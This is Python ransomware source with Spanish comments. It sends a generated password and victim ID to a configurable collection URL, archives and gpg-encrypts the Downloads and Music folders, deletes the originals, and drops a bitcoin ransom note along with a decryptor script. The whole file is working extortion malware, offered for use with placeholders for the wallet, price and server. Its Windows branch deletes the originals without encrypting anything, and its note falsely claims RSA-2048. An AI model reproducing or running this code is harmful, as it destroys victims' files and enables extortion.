import os
import sys
import subprocess
import random
import string
import requests
import re
import platform

def linux():
    s = string.ascii_lowercase + string.digits
    pwd = str(''.join(random.sample(s, 30)))
    #Genera un ID unico
    t = string.ascii_lowercase
    idd = str(''.join(random.sample(t, 10)))
    #se ejecutan las funciones para cifrar los datos
    sendCred(url, pwd, idd)
    crypt(directories, pwd)
    howto(directories, bitcoin, price)
    decryptGen(str(directories))

def windows():
    s = string.ascii_lowercase + string.digits
    pwd = str(''.join(random.sample(s, 30)))
    #Genera un ID unico
    t = string.ascii_lowercase
    idd = str(''.join(random.sample(t, 10)))
    #se ejecutan las funciones para cifrar los datos
    sendCred(url, pwd, idd)
    crypt_windows(directories, pwd)
    howto_windows(directories, bitcoin, price)
    decryptGen_windows(str(directories))

def sendCred(url, pwd, idd):
    values = {'pass' : pwd,'id' : idd}
    r = requests.post(url, values)
    page = r.text
    if(page != 'Ok.'):
        sys.exit('Ocurrio un error al enviar las credenciales')

def crypt(directory, pwd):
    if(type(directory) != list):
        sys.exit('El formato recibido es incorrecto!')

    for dirr in directory:
        os.chdir(dirr)
        os.system('tar cvf encrypted.tar *')
        os.system('find . ! -name encrypted.tar -type f -delete')
        os.system('find . ! -name encrypted.tar -type d -delete')
        os.system('echo ' + pwd + ' | gpg --batch --passphrase-fd 0 -c encrypted.tar')
        os.system('rm encrypted.tar')
        os.chdir('../')
        print("-------------------")

def crypt_windows(directory, pwd):
    if(type(directory) != list):
        sys.exit('El formato recibido es incorrecto!')

    for dirr in directory:
        os.chdir(dirr)
        # Usar PowerShell para comprimir archivos en Windows
        os.system('powershell Compress-Archive -Path * -DestinationPath encrypted.zip')
        # Eliminar archivos originales (cuidado con este comando)
        os.system('powershell Get-ChildItem -Exclude encrypted.zip | Remove-Item -Recurse -Force')
        # En Windows necesitarías una herramienta externa para cifrar o implementar cifrado en Python
        print("Directorio cifrado: " + dirr)
        os.chdir('../')
        print("-------------------")

def howto(directory, bitcoin, price):
    txt = "\n"
    txt +="Hola te estaras preguntando Que paso con tus archivos?\n"
    txt +="todos ellos fueron cifrados con RSA-2048\n"
    txt +="si los quieres recuperar me debes pagar : " + str(price) + "\n"
    txt +="Mi direccion de bitcoins es: " + bitcoin + "\n"
    txt +="1 bitcoin ~= 240 US $ aproximadamente \n"
    txt +="Cuando recibas el password usa el archivo decrypt.py\n\n" 
    txt +="que tengas un lindo dia y mejor suerte para la proxima :)\n\n "
    archivo = open("recuperar-mis-archivos.txt","w")
    archivo.write(txt)
    archivo.close()
    for dirr in directory:
        os.system("cp 'recuperar-mis-archivos.txt' " + dirr)

def howto_windows(directory, bitcoin, price):
    txt = "\n"
    txt +="Hola te estaras preguntando Que paso con tus archivos?\n"
    txt +="todos ellos fueron cifrados con RSA-2048\n"
    txt +="si los quieres recuperar me debes pagar : " + str(price) + "\n"
    txt +="Mi direccion de bitcoins es: " + bitcoin + "\n"
    txt +="1 bitcoin ~= 240 US $ aproximadamente \n"
    txt +="Cuando recibas el password usa el archivo decrypt.py\n\n" 
    txt +="que tengas un lindo dia y mejor suerte para la proxima :)\n\n "
    archivo = open("recuperar-mis-archivos.txt","w")
    archivo.write(txt)
    archivo.close()
    for dirr in directory:
        os.system("copy 'recuperar-mis-archivos.txt' " + dirr)

def decryptGen(directory):
    txt = ""
    txt +="#!/usr/bin/python3\n"
    txt +="import os\n"
    txt +="import sys\n"
    txt +="directory = " + directory + "\n"
    txt +="pwd = input('Ingrese el password para decifrar los archivos: ')\n"
    txt +="for dirr in directory:\n"
    txt +="    os.chdir(dirr)\n"
    txt +="    if(os.system('gpg --batch --passphrase ' + pwd + ' -d encrypted.tar.gpg > unencrypted.tar') != 0):\n"
    txt +="        sys.exit('Password Incorrecto!')\n"
    txt +="    os.system('tar xvf unencrypted.tar')\n"
    txt +="    os.system('rm unencrypted.tar')\n"
    txt +="    os.system('rm encrypted.tar.gpg')\n"
    txt +="    os.system('rm recuperar-mis-archivos.txt')\n"
    txt +="    os.chdir('../')\n"
    archivo = open("decrypt.py","w")
    archivo.write(txt)
    archivo.close()

def decryptGen_windows(directory):
    txt = ""
    txt +="import os\n"
    txt +="import sys\n"
    txt +="directory = " + directory + "\n"
    txt +="pwd = input('Ingrese el password para decifrar los archivos: ')\n"
    txt +="for dirr in directory:\n"
    txt +="    os.chdir(dirr)\n"
    txt +="    # Aquí iría la lógica de descifrado para Windows\n"
    txt +="    os.system('powershell Expand-Archive -Path encrypted.zip -DestinationPath .')\n"
    txt +="    os.system('del encrypted.zip')\n"
    txt +="    os.system('del recuperar-mis-archivos.txt')\n"
    txt +="    os.chdir('../')\n"
    archivo = open("decrypt.py","w")
    archivo.write(txt)
    archivo.close()

#directorios a cifrar
directories = ['Downloads','Music'] 
bitcoin = 'aAhR54GVf45FFf3q2kL' #ingresa aqui tu direccion de BitCoin
price = 3 # Ingresa el monto a pedir
url = 'http://localhost/victima.php' #ingresa la Url a donde se va enviar el id y password

#verificar que sistema operativo esta detras
if(sys.platform == 'Linux' or sys.platform == 'linux2'):
    linux()
elif(sys.platform == 'win32' or sys.platform == 'windows'):
    windows()
else:
    sys.exit('Not supported !')
